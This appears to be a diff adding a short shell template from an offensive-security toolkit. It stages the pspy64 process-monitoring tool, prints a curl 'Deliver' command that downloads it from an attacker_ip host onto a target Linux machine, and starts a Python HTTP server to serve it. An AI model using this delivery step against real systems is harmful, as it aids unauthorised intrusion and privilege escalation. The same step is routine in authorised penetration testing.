@@ -1,0 +1,6 @@
+mkdir -p packstation/outbound; cp -n <%=$(esh variables/tools_dir)%>/pspy/pspy64 packstation/outbound/; \
+echo '================================================================'; \
+echo '                       -----Linux------                         '; \
+echo 'Deliver: curl http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/pspy64 -o <%=$(esh variables/delivery_path_linux)%>/pspy64'; \
+echo '================================================================'; \
+python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
